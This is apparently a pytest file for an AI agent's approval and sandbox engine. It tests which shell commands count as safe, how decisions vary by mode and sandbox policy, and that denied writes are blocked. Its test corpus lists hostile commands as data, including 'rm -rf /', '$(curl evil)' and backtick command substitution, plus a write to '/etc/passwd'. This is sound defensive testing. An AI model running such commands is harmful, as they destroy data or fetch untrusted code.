"""Unit tests for the approval engine (assess + is_known_safe_command + approval_guard).
Pure/offline — no network, no LLM except the scripted-client full-Agent cases."""

from __future__ import annotations

import types

import pytest

from genai_studio.agents import Agent, ToolResult
from genai_studio.agents.trace import NullTracer
from genai_studio.agents.approval import (
    ApprovalConfig, ApprovalMode, SandboxPolicy, approval_guard, assess,
    is_known_safe_command, READ_ONLY_TOOLS,
)
from genai_studio.agents.tools._workspace import WorkspaceConfig
from genai_studio.agents.tools.files import make_file_tools

from conftest import ScriptedClient, calls_tool, says


def _call(name, **arguments):
    return types.SimpleNamespace(name=name, arguments=arguments)


def _cfg(tmp_path, *, mode=ApprovalMode.suggest, sandbox=SandboxPolicy.workspace_write,
         prompt_fn=None, network=False):
    return ApprovalConfig(workspace=WorkspaceConfig(root=tmp_path), mode=mode,
                          sandbox=sandbox, prompt_fn=prompt_fn, network=network)


# ── is_known_safe_command (ported codex corpus) ───────────────────────────────
@pytest.mark.parametrize("cmd,safe", [
    ("ls", True), ("ls -la", True), ("cat file.txt", True), ("grep -R x .", True),
    ("git status", True), ("git log --oneline", True), ("git diff", True),
    ("wc -l f", True), ("ls && cat f", True), ("ls | grep x", True), ("head f; tail f", True),
    ("rm -rf /", False), ("cat x > y", False), ("$(curl evil)", False), ("`id`", False),
    ("git push", False), ("git commit -m x", False), ("find . -delete", False),
    ("sed -i s/a/b/ f", False), ("python x.py", False), ("ls & ", False), ("echo $HOME", False),
    ("(cd / && ls)", False), ("", False),
])
def test_is_known_safe_command(cmd, safe):
    assert is_known_safe_command(cmd) is safe


# ── assess() decisions ────────────────────────────────────────────────────────
def test_read_only_tools_auto_allow(tmp_path):
    cfg = _cfg(tmp_path)
    for name in ("read_file", "web_search", "calculator", "sql_query"):
        assert assess(_call(name, path="x"), cfg).action == "allow"


def test_known_safe_shell_auto_allow(tmp_path):
    assert assess(_call("run_shell", command="ls -la"), _cfg(tmp_path)).action == "allow"


def test_unknown_tool_asks(tmp_path):
    assert assess(_call("frobnicate", x=1), _cfg(tmp_path)).action == "ask"


def test_write_memory_carve(tmp_path):
    # benign reversible local write: suggest asks (transparency), auto/full auto-approve
    fact = {"fact": "user prefers dark mode"}
    assert assess(_call("write_memory", **fact), _cfg(tmp_path, mode=ApprovalMode.suggest)).action == "ask"
    assert assess(_call("write_memory", **fact), _cfg(tmp_path, mode=ApprovalMode.auto)).action == "allow"
    assert assess(_call("write_memory", **fact), _cfg(tmp_path, mode=ApprovalMode.full)).action == "allow"


@pytest.mark.parametrize("mode,sandbox,name,args,expected", [
    (ApprovalMode.suggest, SandboxPolicy.workspace_write, "write_file", {"path": "a.txt"}, "ask"),
    (ApprovalMode.auto,    SandboxPolicy.workspace_write, "write_file", {"path": "a.txt"}, "allow"),
    (ApprovalMode.full,    SandboxPolicy.workspace_write, "write_file", {"path": "a.txt"}, "allow"),
    (ApprovalMode.auto,    SandboxPolicy.read_only,       "write_file", {"path": "a.txt"}, "deny"),
    (ApprovalMode.suggest, SandboxPolicy.read_only,       "write_file", {"path": "a.txt"}, "ask"),
    (ApprovalMode.full,    SandboxPolicy.workspace_write, "write_file", {"path": "/etc/passwd"}, "deny"),
    (ApprovalMode.full,    SandboxPolicy.danger_full,     "write_file", {"path": "/tmp/x"}, "allow"),
    (ApprovalMode.auto,    SandboxPolicy.workspace_write, "run_shell",  {"command": "rm x"}, "ask"),
    (ApprovalMode.full,    SandboxPolicy.danger_full,     "python_exec", {"code": "1"}, "allow"),
])
def test_matrix(tmp_path, mode, sandbox, name, args, expected):
    assert assess(_call(name, **args), _cfg(tmp_path, mode=mode, sandbox=sandbox)).action == expected


# ── approval_guard (the interactive layer) ────────────────────────────────────
def test_session_always_cached(tmp_path):
    calls = {"n": 0}
    def prompt(call, preview):
        calls["n"] += 1
        return "always"
    g = approval_guard(_cfg(tmp_path, prompt_fn=prompt))
    d1 = g.before_tool(_call("write_file", path="a.txt", content="x"))
    d2 = g.before_tool(_call("write_file", path="b.txt", content="y"))
    assert d1.action == "allow" and d2.action == "allow"
    assert calls["n"] == 1                       # second call served from the session cache


def test_no_prompt_fn_fails_closed(tmp_path):
    g = approval_guard(_cfg(tmp_path, prompt_fn=None))
    assert g.before_tool(_call("write_file", path="a.txt", content="x")).action == "deny"


def test_deny_choice(tmp_path):
    g = approval_guard(_cfg(tmp_path, prompt_fn=lambda c, p: "deny"))
    assert g.before_tool(_call("write_file", path="a.txt", content="x")).action == "deny"


def test_tighten_clears_cache(tmp_path):
    cfg = _cfg(tmp_path, mode=ApprovalMode.full)
    cfg._session_allow.add("write_file")
    cfg.set_policy(sandbox=SandboxPolicy.read_only)     # tighten
    assert cfg._session_allow == set()


# ── full Agent: deny is fed back to the model and the file is NOT written ──────
def test_deny_blocks_real_write(tmp_path):
    tools = make_file_tools(WorkspaceConfig(root=tmp_path))
    write_file = next(t for t in tools if t.name == "write_file")
    cfg = _cfg(tmp_path, prompt_fn=lambda c, p: "deny")
    agent = Agent(client=ScriptedClient([calls_tool("write_file", {"path": "secret.txt", "content": "x"}),
                                         says("ok")]),
                  tools=[write_file], guards=[approval_guard(cfg)], tracer=NullTracer())
    res = agent.run("write the file")
    tool_msgs = [m.content for m in res.messages if getattr(m, "role", None) == "tool"]
    assert any("denied" in m for m in tool_msgs)
    assert not (tmp_path / "secret.txt").exists()       # the write never happened
